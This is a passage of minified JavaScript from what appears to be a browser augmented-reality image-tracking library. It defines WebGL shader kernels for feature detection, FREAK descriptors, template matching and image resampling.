                worldCoords: g,
                screenCoords: b,
                debugExtra: o
            }
        }
        _computeMatching(t, e, s, o) {
            const d = o.shape[0]
              , h = o.shape[1]
              , p = t.shape[0];
            if (!this.kernelCaches.computeMatching) {
                const f = {
                    variableNames: ["features", "markerPixels", "markerProperties", "targetPixels"],
                    outputShape: [p, 441],
                    userCode: `\n\t  void main() {\n\t    ivec2 coords = getOutputCoords();\n\n\t    int featureIndex = coords[0];\n\t    int searchOffsetIndex = coords[1];\n\n\t    int markerWidth = int(getMarkerProperties(0));\n\t    int markerHeight = int(getMarkerProperties(1));\n\t    float markerScale = getMarkerProperties(2);\n\n\t    int searchOffsetX = imod(searchOffsetIndex, 21) * 1;\n\t    int searchOffsetY = searchOffsetIndex / 21 * 1;\n\n\t    int sCenterX = int(getFeatures(featureIndex, 0) * markerScale);\n\t    int sCenterY = int(getFeatures(featureIndex, 1) * markerScale);\n\n\t    int sx = sCenterX + searchOffsetX - 10;\n\t    int sy = sCenterY + searchOffsetY - 10;\n\n\t    if (sx < 6 || sx >= (${h} - 6) || sy < 6 || sy >= (${d} - 6)) {\n\t      setOutput(-2.);\n\t    } \n\t    else {\n\t      float sumPoint = 0.;\n\t      float sumPointSquare = 0.;\n\t      float sumTemplate = 0.;\n\t      float sumTemplateSquare = 0.;\n\t      float sumPointTemplate = 0.;\n\n\t      for (int templateOffsetY = 0; templateOffsetY < 13; templateOffsetY++) {\n\t\tfor (int templateOffsetX = 0; templateOffsetX < 13; templateOffsetX++) {\n\t\t  int fx2 = sCenterX + templateOffsetX - 6;\n\t\t  int fy2 = sCenterY + templateOffsetY - 6;\n\n\t\t  int sx2 = sx + templateOffsetX - 6;\n\t\t  int sy2 = sy + templateOffsetY - 6;\n\n\t\t  int markerPixelIndex = fy2 * markerWidth + fx2;\n\t\t  float markerPixel = getMarkerPixels(markerPixelIndex);\n\t\t  float targetPixel = getTargetPixels(sy2, sx2);\n\n\t\t  sumTemplate += markerPixel;\n\t\t  sumTemplateSquare += markerPixel * markerPixel;\n\t\t  sumPoint += targetPixel;\n\t\t  sumPointSquare += targetPixel * targetPixel;\n\t\t  sumPointTemplate += targetPixel * markerPixel;\n\t\t}\n\t      }\n\n\t      // Normalized cross-correlation\n\t      // !important divide first avoid overflow (e.g. sumPoint / count * sumPoint)\n\t      float count = float(13 * 13);\n\t      float pointVariance = sqrt(sumPointSquare - sumPoint / count * sumPoint);\n\t      float templateVariance = sqrt(sumTemplateSquare - sumTemplate / count * sumTemplate);\n\n\t      if (pointVariance < 0.0000001) {\n\t\tsetOutput(-3.);\n\t      } else if (templateVariance < 0.0000001) {\n\t\t//setOutput(sumTemplate);\n\t\tsetOutput(-4.);\n\t      } else {\n\t\tsumPointTemplate -= sumPoint / count * sumTemplate;\n\t\tfloat sim = sumPointTemplate / pointVariance / templateVariance;  \n\t\tsetOutput(sim);\n\t      }\n\t    }\n\t  }\n\t`
                }
                  , m = {
                    variableNames: ["featurePoints", "markerProperties", "maxIndex"],
                    outputShape: [p, 2],
                    userCode: "\n\t  void main() {\n\t    ivec2 coords = getOutputCoords();\n\n\t    float markerScale = getMarkerProperties(2);\n\n\t    int featureIndex = coords[0];\n\n\t    int maxIndex = int(getMaxIndex(featureIndex));\n\t    int searchLocationIndex = maxIndex / 441;\n\t    int searchOffsetIndex = imod(maxIndex, 441);\n\n\t    if (coords[1] == 0) {\n\t      int searchOffsetX = imod(searchOffsetIndex, 21) * 1;\n\t      setOutput(getFeaturePoints(featureIndex, 0) + float(searchOffsetX - 10) / markerScale);\n\t    }\n\t    else if (coords[1] == 1) {\n\t      int searchOffsetY = searchOffsetIndex / 21 * 1;\n\t      setOutput(getFeaturePoints(featureIndex, 1) + float(searchOffsetY - 10) / markerScale);\n\t    }\n\t  }\n\t"
                }
                  , g = {
                    variableNames: ["sims", "maxIndex"],
                    outputShape: [p],
                    userCode: "\n\t  void main() {\n\t    int featureIndex = getOutputCoords();\n\t    int maxIndex = int(getMaxIndex(featureIndex));\n\t    setOutput(getSims(featureIndex, maxIndex));\n\t  }\n\t"
                };
                this.kernelCaches.computeMatching = [f, m, g]
            }
            return M((()=>{
                const f = this.kernelCaches.computeMatching
                  , m = this._compileAndRun(f[0], [t, e, s, o])
                  , g = m.argMax(1);
                return {
                    matchingPointsT: this._compileAndRun(f[1], [t, s, g]),
                    simT: this._compileAndRun(f[2], [m, g])
                }
            }
            ))
        }
        _computeProjection(t, e, s) {
            const o = this.trackingKeyframeList[s].width
              , r = this.trackingKeyframeList[s].height
              , i = this.trackingKeyframeList[s].scale
              , a = o + "-" + r + "-" + i;
            if (this.kernelCaches.computeProjection || (this.kernelCaches.computeProjection = {}),
            !this.kernelCaches.computeProjection[a]) {
                const c = {
                    variableNames: ["M", "pixel"],
                    outputShape: [r, o],
                    userCode: `\n\t  void main() {\n\t      ivec2 coords = getOutputCoords();\n\n\t      float m00 = getM(0, 0) * 1000.;\n\t      float m01 = getM(0, 1) * 1000.;\n\t      float m03 = getM(0, 3) * 1000.;\n\t      float m10 = getM(1, 0) * 1000.;\n\t      float m11 = getM(1, 1) * 1000.;\n\t      float m13 = getM(1, 3) * 1000.;\n\t      float m20 = getM(2, 0) * 1000.;\n\t      float m21 = getM(2, 1) * 1000.;\n\t      float m23 = getM(2, 3) * 1000.;\n\n\t      float y = float(coords[0]) / float(${i});\n\t      float x = float(coords[1]) / float(${i});\n\t      float uz = (x * m20) + (y * m21) + m23;\n\t      float oneOverUz = 1. / uz;\n\n\t      float ux = (x * m00) + (y * m01) + m03;\n\t      float uy = (x * m10) + (y * m11) + m13;\n\n\t      ux = floor(ux * oneOverUz + 0.5);\n\t      uy = floor(uy * oneOverUz + 0.5);\n\t      setOutput(getPixel(int(uy), int(ux)));\n\t    }\n\t`
                };
                this.kernelCaches.computeProjection[a] = c
            }
            return M((()=>{
                const c = this.kernelCaches.computeProjection[a];
                return this._compileAndRun(c, [t, e])
            }
            ))
        }
        _buildAdjustedModelViewTransform(t) {
            return M((()=>{
                let e = [];
                for (let o = 0; o < t.length; o++) {
                    e.push([]);
                    for (let r = 0; r < t[o].length; r++)
                        e[o].push(t[o][r] / qn)
                }
                return tn(e, [3, 4])
            }
            ))
        }
        _prebuild(t, e) {
            return M((()=>{
                const s = t.scale
                  , o = [];
                for (let c = 0; c < e; c++)
                    c < t.points.length ? o.push([t.points[c].x / s, t.points[c].y / s]) : o.push([-1, -1]);
                const r = tn(t.data, [t.width * t.height])
                  , i = tn([t.width, t.height, t.scale], [3]);
                return {
                    featurePoints: tn(o, [o.length, 2], "float32"),
                    imagePixels: r,
                    imageProperties: i
                }
            }
            ))
        }
        _compileAndRun(t, e) {
            const s = ys().compileAndRun(t, e);
            return zt().makeTensorFromDataId(s.dataId, s.shape, s.dtype)
        }
    }
    const Fl = [{
        sigma: .55,
        points: [[-1, 0], [-.5, -.866025], [.5, -.866025], [1, -0], [.5, .866025], [-.5, .866025]]
    }, {
        sigma: .475,
        points: [[0, .930969], [-.806243, .465485], [-.806243, -.465485], [-0, -.930969], [.806243, -.465485], [.806243, .465485]]
    }, {
        sigma: .4,
        points: [[.847306, -0], [.423653, .733789], [-.423653, .733789], [-.847306, 0], [-.423653, -.733789], [.423653, -.733789]]
    }, {
        sigma: .325,
        points: [[-0, -.741094], [.641806, -.370547], [.641806, .370547], [0, .741094], [-.641806, .370547], [-.641806, -.370547]]
    }, {
        sigma: .25,
        points: [[-.595502, 0], [-.297751, -.51572], [.297751, -.51572], [.595502, -0], [.297751, .51572], [-.297751, .51572]]
    }, {
        sigma: .175,
        points: [[0, .362783], [-.314179, .181391], [-.314179, -.181391], [-0, -.362783], [.314179, -.181391], [.314179, .181391]]
    }, {
        sigma: .1,
        points: [[0, 0]]
    }]
      , $o = [];
    for (let n = 0; n < Fl.length; n++) {
        const t = Fl[n].sigma;
        for (let e = 0; e < Fl[n].points.length; e++) {
            const s = Fl[n].points[e];
            $o.push([t, s[0], s[1]])
        }
    }
    const Xp = {};
    const l9 = {
        kernelName: "BinomialFilter",
        backendName: "webgl",
        kernelFunc: n=>{
            const t = n.inputs.image
              , e = n.backend
              , [s,o] = function c9(n) {
                const t = n.shape[1]
                  , e = n.shape[0]
                  , s = "w" + t + "h" + e;
                if (!Xp.hasOwnProperty(s)) {
                    const o = {
                        variableNames: ["p"],
                        outputShape: [e, t],
                        userCode: "\n        void main() {\n          ivec2 coords = getOutputCoords();\n\n          float sum = getP(coords[0], coords[1]-2);\n          sum += getP(coords[0], coords[1]-1) * 4.;\n          sum += getP(coords[0], coords[1]) * 6.;\n          sum += getP(coords[0], coords[1]+1) * 4.;\n          sum += getP(coords[0], coords[1]+2);\n          setOutput(sum);\n        }\n      "
                    }
                      , r = {
                        variableNames: ["p"],
                        outputShape: [e, t],
                        userCode: "\n        void main() {\n          ivec2 coords = getOutputCoords();\n\n          float sum = getP(coords[0]-2, coords[1]);\n          sum += getP(coords[0]-1, coords[1]) * 4.;\n          sum += getP(coords[0], coords[1]) * 6.;\n          sum += getP(coords[0]+1, coords[1]) * 4.;\n          sum += getP(coords[0]+2, coords[1]);\n          sum /= 256.;\n          setOutput(sum);\n        }\n      "
                    };
                    Xp[s] = [o, r]
                }
                return Xp[s]
            }(t)
              , r = e.runWebGLProgram(s, [t], t.dtype)
              , i = e.runWebGLProgram(o, [r], t.dtype);
            return e.disposeIntermediateTensorInfo(r),
            i
        }
    }
      , Pp = {};
    const p9 = {
        kernelName: "BuildExtremas",
        backendName: "webgl",
        kernelFunc: n=>{
            let {image0: t, image1: e, image2: s} = n.inputs;
            const o = n.backend
              , r = function h9(n) {
                const t = n.shape[1]
                  , e = n.shape[0]
                  , s = "w" + t + "h" + e;
                if (!Pp.hasOwnProperty(s)) {
                    const o = {
                        variableNames: ["image0", "image1", "image2"],
                        outputShape: [e, t],
                        userCode: `\n        void main() {\n          ivec2 coords = getOutputCoords();\n    \n          int y = coords[0];\n          int x = coords[1];\n    \n          float value = getImage1(y, x);\n    \n          // Step 1: find local maxima/minima\n          if (value * value < 9.) {\n            setOutput(0.);\n            return;\n          }\n          if (y < 7 || y > ${e - 1 - 7}) {\n            setOutput(0.);\n            return;\n          }\n          if (x < 7 || x > ${t - 1 - 7}) {\n            setOutput(0.);\n            return;\n          }\n    \n          bool isMax = true;\n          bool isMin = true;\n          for (int dy = -1; dy <= 1; dy++) {\n            for (int dx = -1; dx <= 1; dx++) {\n              float value0 = getImage0(y+dy, x+dx);\n              float value1 = getImage1(y+dy, x+dx);\n              float value2 = getImage2(y+dy, x+dx);\n    \n        if (value < value0 || value < value1 || value < value2) {\n          isMax = false;\n        }\n        if (value > value0 || value > value1 || value > value2) {\n          isMin = false;\n        }\n            }\n          }\n    \n          if (!isMax && !isMin) {\n            setOutput(0.);\n            return;\n          }\n    \n          // compute edge score and reject based on threshold\n          float dxx = getImage1(y, x+1) + getImage1(y, x-1) - 2. * getImage1(y, x);\n          float dyy = getImage1(y+1, x) + getImage1(y-1, x) - 2. * getImage1(y, x);\n          float dxy = 0.25 * (getImage1(y-1,x-1) + getImage1(y+1,x+1) - getImage1(y-1,x+1) - getImage1(y+1,x-1));\n    \n          float det = (dxx * dyy) - (dxy * dxy);\n    \n          if (abs(det) < 0.0001) { // determinant undefined. no solution\n            setOutput(0.);\n            return;\n          }\n    \n          float edgeScore = (dxx + dyy) * (dxx + dyy) / det;\n    \n          if (abs(edgeScore) >= 6.25 ) {\n            setOutput(0.);\n            return;\n          }\n          setOutput(getImage1(y,x));\n        }\n      `
                    };
                    Pp[s] = o
                }
                return Pp[s]
            }(e);
            return t = zt().runKernel("DownsampleBilinear", {
                image: t
            }),
            s = zt().runKernel("UpsampleBilinear", {
                image: s,
                targetImage: e
            }),
            o.runWebGLProgram(r, [t, e, s], e.dtype)
        }
    }
      , Op = {};
    const m9 = {
        kernelName: "ComputeExtremaAngles",
        backendName: "webgl",
        kernelFunc: n=>{
            const {histograms: t} = n.inputs
              , e = n.backend
              , s = function f9(n) {
                const t = n.shape[0];
                if (!Op.hasOwnProperty(t)) {
                    const e = {
                        variableNames: ["histogram"],
                        outputShape: [n.shape[0]],
                        userCode: `\n            void main() {\n                int featureIndex = getOutputCoords();\n\n                int maxIndex = 0;\n                for (int i = 1; i < 36; i++) {\n                    if (getHistogram(featureIndex, i) > getHistogram(featureIndex, maxIndex)) {\n                        maxIndex = i;\n                    }\n                }\n\n                int prev = imod(maxIndex - 1 + 36, 36);\n                int next = imod(maxIndex + 1, 36);\n\n                /**\n                 * Fit a quatratic to 3 points. The system of equations is:\n                 *\n                 * y0 = A*x0^2 + B*x0 + C\n                 * y1 = A*x1^2 + B*x1 + C\n                 * y2 = A*x2^2 + B*x2 + C\n                 *\n                 * This system of equations is solved for A,B,C.\n                 */\n                float p10 = float(maxIndex - 1);\n                float p11 = getHistogram(featureIndex, prev); \n                float p20 = float(maxIndex);\n                float p21 = getHistogram(featureIndex, maxIndex); \n                float p30 = float(maxIndex + 1);\n                float p31 = getHistogram(featureIndex, next); \n\n                float d1 = (p30-p20)*(p30-p10);\n                float d2 = (p10-p20)*(p30-p10);\n                float d3 = p10-p20;\n\n                // If any of the denominators are zero then, just use maxIndex.\n                    float fbin = float(maxIndex);\n                if ( abs(d1) > 0.00001 && abs(d2) > 0.00001 && abs(d3) > 0.00001) {\n                float a = p10*p10;\n                float b = p20*p20;\n\n                // Solve for the coefficients A,B,C\n                float A = ((p31-p21)/d1)-((p11-p21)/d2);\n                float B = ((p11-p21)+(A*(b-a)))/d3;\n                float C = p11-(A*a)-(B*p10);\n                fbin = -B / (2. * A);\n                }\n\n                float an = 2.0 *${Math.PI} * (fbin + 0.5) / 36. - ${Math.PI};\n                setOutput(an);\n            }\n            `
                    };
                    Op[t] = e
                }
                return Op[t]
            }(t);
            return e.runWebGLProgram(s, [t], t.dtype)
        }
    }
      , Kp = {};
    const b9 = {
        kernelName: "ComputeExtremaFreak",
        backendName: "webgl",
        kernelFunc: n=>{
            const {gaussianImagesT: t, prunedExtremas: e, prunedExtremasAngles: s, freakPointsT: o, pyramidImagesLength: r} = n.inputs
              , i = n.backend
              , a = function g9(n, t) {
                const e = `${n}|${t.shape[0]}`;
                if (!Kp.hasOwnProperty(e)) {
                    const s = [];
                    for (let i = 1; i < n; i++)
                        s.push("image" + i);
                    let o = "float getPixel(int octave, int y, int x) {";
                    for (let i = 1; i < n; i++)
                        o += `\n  if (octave == ${i}) {\n\treturn getImage${i}(y, x);\n  }\n`;
                    o += "}";
                    const r = {
                        variableNames: [...s, "extrema", "angles", "freakPoints"],
                        outputShape: [t.shape[0], $o.length],
                        userCode: `\n  ${o}\n  void main() {\n\tivec2 coords = getOutputCoords();\n\tint featureIndex = coords[0];\n\tint freakIndex = coords[1];\n\n\tfloat freakSigma = getFreakPoints(freakIndex, 0);\n\tfloat freakX = getFreakPoints(freakIndex, 1);\n\tfloat freakY = getFreakPoints(freakIndex, 2);\n\n\tint octave = int(getExtrema(featureIndex, 1));\n\tfloat inputY = getExtrema(featureIndex, 2);\n\tfloat inputX = getExtrema(featureIndex, 3);\n\tfloat inputAngle = getAngles(featureIndex);\n\tfloat cos = 7. * cos(inputAngle);\n\tfloat sin = 7. * sin(inputAngle);\n\n\tfloat yp = inputY + freakX * sin + freakY * cos;\n\tfloat xp = inputX + freakX * cos + freakY * -sin;\n\n\tint x0 = int(floor(xp));\n\tint x1 = x0 + 1;\n\tint y0 = int(floor(yp));\n\tint y1 = y0 + 1;\n\n\tfloat f1 = getPixel(octave, y0, x0);\n\tfloat f2 = getPixel(octave, y0, x1);\n\tfloat f3 = getPixel(octave, y1, x0);\n\tfloat f4 = getPixel(octave, y1, x1);\n\n\tfloat x1f = float(x1);\n\tfloat y1f = float(y1);\n\tfloat x0f = float(x0);\n\tfloat y0f = float(y0);\n\n\t// ratio for interpolation between four neighbouring points\n\tfloat value = (x1f - xp) * (y1f - yp) * f1\n\t\t+ (xp - x0f) * (y1f - yp) * f2\n\t\t+ (x1f - xp) * (yp - y0f) * f3\n\t\t+ (xp - x0f) * (yp - y0f) * f4;\n\n\tsetOutput(value);\n  }\n`
                    };
                    Kp[e] = r
                }
                return Kp[e]
            }(r, e);
            return i.runWebGLProgram(a, [...t, e, s, o], "float32")
        }
    }
      , RI = ($o.length - 1) * $o.length / 2
      , x9 = Math.ceil(RI / 8)
      , Zp = {};
    const I9 = {
        kernelName: "ComputeFreakDescriptors",
        backendName: "webgl",
        kernelFunc: n=>{
            const {extremaFreaks: t, positionT: e} = n.inputs
              , {backend: s} = n
              , o = function y9(n) {
                const t = `${n.shape[0]}`;
                if (!Zp.hasOwnProperty(t)) {
                    const e = {
                        variableNames: ["freak", "p"],
                        outputShape: [n.shape[0], x9],
                        userCode: `\n  void main() {\n    ivec2 coords = getOutputCoords();\n    int featureIndex = coords[0];\n    int descIndex = coords[1] * 8;\n\n    int sum = 0;\n    for (int i = 0; i < 8; i++) {\n      if (descIndex + i >= ${RI}) {\n        continue;\n      }\n\n      int p1 = int(getP(descIndex + i, 0));\n      int p2 = int(getP(descIndex + i, 1));\n\n      float v1 = getFreak(featureIndex, p1);\n      float v2 = getFreak(featureIndex, p2);\n\n      if (v1 < v2 + 0.01) {\n        sum += int(pow(2.0, float(7 - i)));\n      }\n    }\n    setOutput(float(sum));\n  }\n`
                    };
                    Zp[t] = e
                }
                return Zp[t]
            }(t);
            return s.runWebGLProgram(o, [t, e], "int32")
        }
    }
      , Bp = {};
    const C9 = {
        kernelName: "ComputeLocalization",
        backendName: "webgl",
        kernelFunc: n=>{
            const {prunedExtremasList: t, dogPyramidImagesT: e} = n.inputs
              , s = n.backend
              , o = function w9(n, t) {
                const e = `${n}|${t}`;
                if (!Bp.hasOwnProperty(e)) {
                    const s = [];
                    let o = "float getPixel(int octave, int y, int x) {";
                    for (let r = 1; r < n; r++)
                        s.push("image" + r),
                        o += `\n\t\t\t\tif (octave == ${r}) {\n\t\t\t\t\treturn getImage${r}(y, x);\n\t\t\t\t}\n\t\t\t`;
                    o += "}",
                    Bp[e] = {
                        variableNames: [...s, "extrema"],
                        outputShape: [t, 3, 3],
                        userCode: `\n\t\t\t${o}\n\t\t\n\t\t\tvoid main() {\n\t\t\t\tivec3 coords = getOutputCoords();\n\t\t\t\tint featureIndex = coords[0];\n\t\t\t\tfloat score = getExtrema(featureIndex, 0);\n\t\t\t\tif (score == 0.0) {\n\t\t\t\t\treturn;\n\t\t\t\t}\n\t\t\n\t\t\t\tint dy = coords[1]-1;\n\t\t\t\tint dx = coords[2]-1;\n\t\t\t\tint octave = int(getExtrema(featureIndex, 1));\n\t\t\t\tint y = int(getExtrema(featureIndex, 2));\n\t\t\t\tint x = int(getExtrema(featureIndex, 3));\n\t\t\t\tsetOutput(getPixel(octave, y+dy, x+dx));\n\t\t\t}\n\t\t\t`
                    }
                }
                return Bp[e]
            }(e.length, t.length)
              , r = tn(t, [t.length, t[0].length], "int32");
            return s.runWebGLProgram(o, [...e.slice(1), r], e[0].dtype)
        }
    }
      , Hp = {};
    const k9 = {
        kernelName: "ComputeOrientationHistograms",
        backendName: "webgl",
        kernelFunc: n=>{
            const {gaussianImagesT: t, prunedExtremasT: e, radialPropertiesT: s, pyramidImagesLength: o} = n.inputs
              , r = n.backend
              , [i,a] = function S9(n, t, e) {
                const s = `${e}|${n.shape[0]}|${t.shape[0]}`;
                if (!Hp.hasOwnProperty(s)) {
                    const o = [];
                    for (let c = 1; c < e; c++)
                        o.push("image" + c);
                    let r = "float getPixel(int octave, int y, int x) {";
                    for (let c = 1; c < e; c++)
                        r += `\n            if (octave == ${c}) {\n                return getImage${c}(y, x);\n            }\n            `;
                    r += "}";
                    const i = {
                        variableNames: [...o, "extrema", "radial"],
                        outputShape: [n.shape[0], t.shape[0], 2],
                        userCode: `\n                ${r}\n\n                void main() {\n                    ivec3 coords = getOutputCoords();\n                    int featureIndex = coords[0];\n                    int radialIndex = coords[1];\n                    int propertyIndex = coords[2];\n\n                    int radialY = int(getRadial(radialIndex, 0));\n                    int radialX = int(getRadial(radialIndex, 1));\n                    float radialW = getRadial(radialIndex, 2);\n\n                    int octave = int(getExtrema(featureIndex, 1));\n                    int y = int(getExtrema(featureIndex, 2));\n                    int x = int(getExtrema(featureIndex, 3));\n\n                    int xp = x + radialX;\n                    int yp = y + radialY;\n\n                    float dy = getPixel(octave, yp+1, xp) - getPixel(octave, yp-1, xp);\n                    float dx = getPixel(octave, yp, xp+1) - getPixel(octave, yp, xp-1);\n\n                    if (propertyIndex == 0) {\n                    // be careful that atan(0, 0) gives 1.57 instead of 0 (different from js), but doesn't matter here, coz magnitude is 0\n                    \n                    float angle = atan(dy, dx) + ${Math.PI};\n                    float fbin = angle * 36. * 0.159154943091895;\n                    setOutput(fbin);\n                    return;\n                    }\n\n                    if (propertyIndex == 1) {\n                        float mag = sqrt(dx * dx + dy * dy);\n                        float magnitude = radialW * mag;\n                        setOutput(magnitude);\n                        return;\n                    }\n                }\n\n                `
                    }
                      , a = {
                        variableNames: ["fbinMag"],
                        outputShape: [n.shape[0], 36],
                        userCode: `\n            void main() {\n                ivec2 coords = getOutputCoords();\n                int featureIndex = coords[0];\n                int binIndex = coords[1];\n\n                float sum = 0.;\n                for (int i = 0; i < ${t.shape[0]}; i++) {\n                    float fbin = getFbinMag(featureIndex, i, 0);\n                    int bin = int(floor(fbin - 0.5));\n                    int b1 = imod(bin + 36, 36);\n                    int b2 = imod(bin + 1 + 36, 36);\n\n                    if (b1 == binIndex || b2 == binIndex) {\n                        float magnitude = getFbinMag(featureIndex, i, 1);\n                        float w2 = fbin - float(bin) - 0.5;\n                        float w1 = w2 * -1. + 1.;\n\n                        if (b1 == binIndex) {\n                            sum += w1 * magnitude;\n                        }\n                        if (b2 == binIndex) {\n                            sum += w2 * magnitude;\n                        }\n                    }\n                }\n                setOutput(sum);\n            }\n            `
                    };
                    Hp[s] = [i, a]
                }
                return Hp[s]
            }(e, s, o)
              , c = r.runWebGLProgram(i, [...t, e, s], s.dtype)
              , l = r.runWebGLProgram(a, [c], s.dtype);
            return r.disposeIntermediateTensorInfo(c),
            l
        }
    }
      , _p = {};
    const N9 = {
        kernelName: "DownsampleBilinear",
        backendName: "webgl",
        kernelFunc: n=>{
            const t = n.inputs.image
              , e = n.backend
              , s = function T9(n) {
                const t = n.shape[1]
                  , e = n.shape[0]
                  , s = "w" + t + "h" + e;
                if (!_p.hasOwnProperty(s)) {
                    const o = {
                        variableNames: ["p"],
                        outputShape: [Math.floor(e / 2), Math.floor(t / 2)],
                        userCode: "\n            void main() {\n                ivec2 coords = getOutputCoords();\n                int y = coords[0] * 2;\n                int x = coords[1] * 2;\n        \n                float sum = getP(y, x) * 0.25;\n                sum += getP(y+1,x) * 0.25; \n                sum += getP(y, x+1) * 0.25; \n                sum += getP(y+1,x+1) * 0.25;\n                setOutput(sum);\n            }\n            "
                    };
                    _p[s] = o
                }
                return _p[s]
            }(t);
            return e.runWebGLProgram(s, [t], t.dtype)
        }
    }
      , R9 = {
        kernelName: "ExtremaReduction",
        backendName: "webgl",
        kernelFunc: n=>{
            const {extremasResultT: t} = n.inputs
              , e = n.backend
              , s = t.shape[0]
              , o = t.shape[1]
              , r = {
                variableNames: ["extrema"],
                outputShape: [Math.floor(s / 2), Math.floor(o / 2)],
                userCode: "\n\t\t  void main() {\n\t\t\tivec2 coords = getOutputCoords();\n\t\t\tint y = coords[0] * 2;\n\t\t\tint x = coords[1] * 2;\n  \n\t\t\tfloat location = 0.0;\n\t\t\tfloat values = getExtrema(y, x);\n  \n\t\t\tif (getExtrema(y+1, x) != 0.0) {\n\t\t\t  location = 1.0;\n\t\t  values = getExtrema(y+1, x);\n\t\t\t}\n\t\t\telse if (getExtrema(y, x+1) != 0.0) {\n\t\t\t  location = 2.0;\n\t\t  values = getExtrema(y, x+1);\n\t\t\t}\n\t\t\telse if (getExtrema(y+1, x+1) != 0.0) {\n\t\t\t  location = 3.0;\n\t\t  values = getExtrema(y+1, x+1);\n\t\t\t}\n  \n\t\t\tif (values < 0.0) {\n\t\t\t  setOutput(location * -1000.0 + values);\n\t\t\t} else {\n\t\t\t  setOutput(location * 1000.0 + values);\n\t\t\t}\n\t\t  }\n\t\t"
            };
            return e.runWebGLProgram(r, [t], t.dtype)
        }
    }
      , Up = {};
    const L9 = {
        kernelName: "SmoothHistograms",
        backendName: "webgl",
        kernelFunc: n=>{
            let {histograms: t} = n.inputs;
            const e = n.backend
              , s = function G9(n) {
                const t = `h${n.shape[0]}`;
                if (!Up.hasOwnProperty(t)) {
                    const e = {
                        variableNames: ["histogram"],
                        outputShape: [n.shape[0], 36],
                        userCode: "\n            void main() {\n                ivec2 coords = getOutputCoords();\n\n                int featureIndex = coords[0];\n                int binIndex = coords[1];\n\n                int prevBin = imod(binIndex - 1 + 36, 36);\n                int nextBin = imod(binIndex + 1, 36);\n                float result = 0.274068619061197 * getHistogram(featureIndex, prevBin) + 0.451862761877606 * getHistogram(featureIndex, binIndex) + 0.274068619061197 * getHistogram(featureIndex, nextBin);\n\n                setOutput(result);\n            }\n            "
                    };
                    Up[t] = e
                }
                return Up[t]
            }(t);
            for (let o = 0; o < 5; o++) {
                const r = t;
                t = e.runWebGLProgram(s, [t], t.dtype),
                o > 0 && e.disposeIntermediateTensorInfo(r)
            }
            return t
        }
    }
      , Yp = {};
    const D9 = {
        kernelName: "UpsampleBilinear",
        backendName: "webgl",
        kernelFunc: n=>{
            const {image: t, targetImage: e} = n.inputs
              , s = n.backend
              , o = function E9(n, t) {
                const e = t.shape[1]
                  , s = t.shape[0]
                  , o = "w" + e + "h" + s;
                if (!Yp.hasOwnProperty(o)) {
                    const r = {
                        variableNames: ["p"],
                        outputShape: [s, e],
                        userCode: "\n              void main() {\n                ivec2 coords = getOutputCoords();\n                int j = coords[0];\n                int i = coords[1];\n        \n                float sj = 0.5 * float(j) - 0.25; \n                float si = 0.5 * float(i) - 0.25;\n        \n                float sj0 = floor(sj);\n                float sj1 = ceil(sj);\n                float si0 = floor(si);\n                float si1 = ceil(si);\n        \n                int sj0I = int(sj0);\n                int sj1I = int(sj1);\n                int si0I = int(si0);\n                int si1I = int(si1);\n        \n                float sum = 0.0;\n                sum += getP(sj0I, si0I) * (si1 - si) * (sj1 - sj);\n                sum += getP(sj1I, si0I) * (si1 - si) * (sj - sj0);\n                sum += getP(sj0I, si1I) * (si - si0) * (sj1 - sj);\n                sum += getP(sj1I, si1I) * (si - si0) * (sj - sj0);\n                setOutput(sum);\n              }\n            "
                    };
                    Yp[o] = r
                }
                return Yp[o]
            }(0, e);
            return s.runWebGLProgram(o, [t], t.dtype)
        }
    };
    qe(l9),
    qe(p9),
    qe(m9),
    qe(b9),
    qe(I9),
    qe(C9),
    qe(k9),
    qe(N9),
    qe(R9),
    qe(L9),
    qe(D9);
    $o.length,
    $o.length;
    class GI {
        constructor(t, e, s=!1) {
            this.debugMode = s,
            this.width = t,
            this.height = e;
            let o = 0;
            for (; t >= 8 && e >= 8 && (t /= 2,
            e /= 2,
            o++,
            5 !== o); )
                ;
            this.numOctaves = o,
            this.tensorCaches = {},
            this.kernelCaches = {}
        }
        detectImageData(t) {
            const e = new Uint8ClampedArray(4 * t.length);
            for (let o = 0; o < t.length; o++)
                e[4 * o] = t[o],
                e[4 * o + 1] = t[o],
                e[4 * o + 2] = t[o],
                e[4 * o + 3] = 255;
            const s = new ImageData(e,this.width,this.height);
            return this.detect(s)
        }
        detect(t) {
            let e = null;
            const s = [];
            for (let b = 0; b < this.numOctaves; b++) {
                let x, I;
                x = 0 === b ? this._applyFilter(t) : this._downsampleBilinear(s[b - 1][s[b - 1].length - 1]),
                I = this._applyFilter(x),
                s.push([x, I])
            }
            const o = [];
            for (let b = 0; b < this.numOctaves; b++) {
                let x = this._differenceImageBinomial(s[b][0], s[b][1]);
                o.push(x)
            }
            const r = [];
            for (let b = 1; b < this.numOctaves - 1; b++) {
                const x = this._buildExtremas(o[b - 1], o[b], o[b + 1]);
                r.push(x)
            }
            const i = this._applyPrune(r)
              , a = this._computeLocalization(i, o)
              , c = this._computeOrientationHistograms(a, s)
              , l = this._smoothHistograms(c)
              , u = this._computeExtremaAngles(l)
              , d = this._computeExtremaFreak(s, a, u)
              , h = this._computeFreakDescriptors(d)
              , p = a.arraySync()
              , f = u.arraySync()
              , m = h.arraySync();
            this.debugMode && (e = {
                pyramidImages: s.map((b=>b.map((x=>x.arraySync())))),
                dogPyramidImages: o.map((b=>b ? b.arraySync() : null)),
                extremasResults: r.map((b=>b.arraySync())),
                extremaAngles: u.arraySync(),
                prunedExtremas: i,
                localizedExtremas: a.arraySync()
            }),
            s.forEach((b=>b.forEach((x=>x.dispose())))),
            o.forEach((b=>b && b.dispose())),
            r.forEach((b=>b.dispose())),
            a.dispose(),
            c.dispose(),
            l.dispose(),
            u.dispose(),
            d.dispose(),
            h.dispose();
            const g = [];
            for (let b = 0; b < p.length; b++) {
                if (0 == p[b][0])
                    continue;
                const x = [];
                for (let T = 0; T < m[b].length; T += 4) {
                    let X = 16777216 * m[b][T] + 65536 * m[b][T + 1] + 256 * m[b][T + 2] + m[b][T + 3];
                    x.push(X)
                }
                const I = p[b][1]
                  , y = p[b][2]
                  , C = p[b][3] * Math.pow(2, I) + Math.pow(2, I - 1) - .5
                  , k = y * Math.pow(2, I) + Math.pow(2, I - 1) - .5
                  , S = Math.pow(2, I);
                g.push({
                    maxima: p[b][0] > 0,
                    x: C,
                    y: k,
                    scale: S,
                    angle: f[b],
                    descriptors: x
                })
            }
            return {
                featurePoints: g,
                debugExtra: e
            }
        }
        _computeFreakDescriptors(t) {
            if (!this.tensorCaches.computeFreakDescriptors) {
                const s = []
                  , o = [];
